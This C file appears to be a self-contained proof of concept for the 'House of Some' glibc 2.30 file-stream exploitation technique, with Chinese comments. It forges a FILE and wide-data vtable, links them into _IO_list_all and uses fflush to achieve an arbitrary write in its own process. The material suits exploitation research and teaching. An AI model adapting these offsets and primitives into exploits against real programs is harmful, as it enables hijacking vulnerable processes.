#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
 * House of Some 消费链验证：glibc 2.30 / x86-64。
 *
 * 2.30 的提交 09e1b0e 删掉了 legacy codecvt 函数表，导致 `_wide_vtable`
 * 的偏移从 +0x130 收缩到 +0xf0；紧接着 2.31 的 70c6e15 又把它进一步
 * 收缩到 +0xe0。这两个版本前后夹着一个只用一版的过渡布局，所以 2.30
 * 必须单独写一份 payload，不能直接照搬相邻版本的偏移。
 */

#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static const char supplied[] = "HOUSE-OF-SOME:2.30";
    unsigned char target[sizeof(supplied)];
    unsigned char lock_storage[64];
    unsigned char wide[0x110] __attribute__((aligned(0x10)));
    struct fake_file_plus fake;
    void **list_slot;
    void *saved_list;
    const unsigned char *file_jumps;
    const void *wfile_jumps;
    int fds[2];

    assert(sizeof(FILE) == 0xd8);
    memset(target, 0, sizeof(target));
    memset(lock_storage, 0, sizeof(lock_storage));
    memset(wide, 0, sizeof(wide));
    memset(&fake, 0, sizeof(fake));

    list_slot = (void **)dlsym(RTLD_DEFAULT, "_IO_list_all");
    file_jumps =
        (const unsigned char *)dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(list_slot != NULL && file_jumps != NULL && wfile_jumps != NULL);
    saved_list = *list_slot;

    assert(pipe(fds) == 0);
    assert(write(fds[1], supplied, sizeof(supplied)) ==
           (ssize_t)sizeof(supplied));
    close(fds[1]);

    fake.file._flags = IO_LINKED;
    fake.file._chain = NULL;
    fake.file._fileno = fds[0];
    fake.file._lock = lock_storage;
    fake.file._mode = 2;
    /* 把 FILE 的 _wide_data 字段指向我们伪造的宽字符对象。 */
    *(void **)((unsigned char *)&fake.file + 0xa0) = wide;

    fake.file._IO_read_base = (char *)target;
    fake.file._IO_read_ptr = (char *)target;
    fake.file._IO_read_end = (char *)target;
    fake.file._IO_write_base = (char *)target;
    fake.file._IO_write_ptr = (char *)target;
    fake.file._IO_write_end = (char *)target + sizeof(target);
    fake.file._IO_buf_base = (char *)target;
    fake.file._IO_buf_end = (char *)target + sizeof(target);
    fake.vtable = wfile_jumps;

    /* 整条调用链和其他版本一样，唯一的 ABI 差异就是最后一行的 +0xf0。 */
    *(void **)(wide + 0x18) = NULL;                    /* 设置 wide->_IO_write_base。 */
    *(void **)(wide + 0x20) = (void *)1;               /* 设置 wide->_IO_write_ptr。 */
    *(void **)(wide + 0x30) = NULL;                    /* 设置 wide->_IO_buf_base。 */
    *(void **)(wide + 0xf0) = (void *)(file_jumps - 0x48); /* 设置 wide->_wide_vtable。 */

    *list_slot = &fake;
    (void)fflush(NULL);
    *list_slot = saved_list;
    close(fds[0]);

    assert(memcmp(target, supplied, sizeof(supplied)) == 0);
    dprintf(STDERR_FILENO,
            "[+] House of Some 2.30 +0xf0 任意写成功（%zu 字节）\n",
            sizeof(supplied));
    return 0;
}
